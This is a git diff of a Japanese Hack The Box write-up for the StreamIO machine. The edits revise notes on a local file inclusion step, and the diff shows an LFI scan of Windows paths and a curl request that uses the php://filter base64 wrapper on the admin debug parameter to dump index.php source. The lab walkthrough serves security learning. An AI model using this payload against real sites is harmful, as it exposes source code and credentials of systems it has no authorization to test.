@@ -521,9 +521,9 @@ c:/WINDOWS/system32/drivers/etc/protocol [Status: 200, Size: 3070, Words: 534, L
 c:/WINDOWS/WindowsUpdate.log [Status: 200, Size: 1988, Words: 119, Lines: 54, Duration: 602ms]
 :: Progress: [236/236] :: Job [1/1] :: 38 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
 ```
-index.phpのソースをlfiで確認したが確認できず  
+ためしにindex.phpのソースをlfiしてみたが確認できず  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_12.png">  
-しかしphpの機能であるラッパーをしようすると確認できた
+しかしphpの機能であるラッパーを使用するとソースコードを確認できた
 ```sh
 └─$ curl -H "Cookie: PHPSESSID=lb933jcft3k5cr2731kas4quip" -k 'https://streamio.htb/admin/index.php?debug=php://filter/convert.base64-encode/resource=index.php' 
 
@@ -534,7 +534,9 @@ index.phpのソースをlfiで確認したが確認できず
 </body>
 </html>
 ```
-デコード
+base64デコード  
+先ほどのラッパーを使用すればどのファイルもdebugパラメータにインクルード処理されるっぽい  
+ちなみにrfiは動作しなかった
 ```php
 └─$ base64 -d base64_index.php 
 <?php
@@ -618,3 +620,6 @@ $handle = sqlsrv_connect('(local)',$connection);
 </body>
 </html>
 ```
+
+
+## STEP 6
